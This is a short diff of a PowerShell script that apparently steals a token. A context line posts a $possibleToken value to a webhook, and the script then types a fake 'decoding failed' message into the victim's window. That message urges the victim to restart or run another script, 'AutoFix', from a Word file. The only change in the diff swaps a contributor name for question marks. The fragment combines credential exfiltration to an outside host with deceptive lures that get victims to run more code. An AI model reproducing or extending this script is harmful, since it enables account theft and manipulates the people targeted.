@@ -22,4 +22,4 @@ $r = Invoke-WebRequest -Uri $webhook -Method POST -Body @{content=$possibleToken
 $wshell = New-Object -ComObject wscript.shell;
 $wshell.SendKeys("{ENTER}");
 $wshell.SendKeys("We are sorry but our program couldnt decode the message behind the file! Its possible that it uses another enryption then we do If this keeps happening we have a few methodes to how youre able to fix it:{ENTER}{ENTER}")
-$wshell.SendKeys('1.Restart your PC: Eventually the ram is just filled up with junk that corrupted the decoding process{ENTER}2. Execute another script from this word file As Example: AutoFix{ENTER} Contributed by 参館民提天{ENTER} If you have other questions how our programm works you can reach out to us at yourbeingcsammed@scammers.scam{ENTER} Good day sir!')
+$wshell.SendKeys('1.Restart your PC: Eventually the ram is just filled up with junk that corrupted the decoding process{ENTER}2. Execute another script from this word file As Example: AutoFix{ENTER} Contributed by ??????{ENTER} If you have other questions how our programm works you can reach out to us at yourbeingcsammed@scammers.scam{ENTER} Good day sir!')
